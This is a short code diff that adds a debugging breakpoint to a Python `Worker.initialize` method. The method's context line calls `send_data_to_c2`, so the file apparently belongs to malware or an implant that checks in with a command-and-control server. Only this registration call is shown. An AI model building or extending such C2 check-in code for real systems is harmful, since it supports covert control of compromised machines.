@@ -30,6 +30,7 @@ logging.info("start")
 class Worker:
     
     def initialize(self):
+            breakpoint()
             logging.info("start initialize")
             try:
                 response = send_data_to_c2("POST", "initialize/", {})
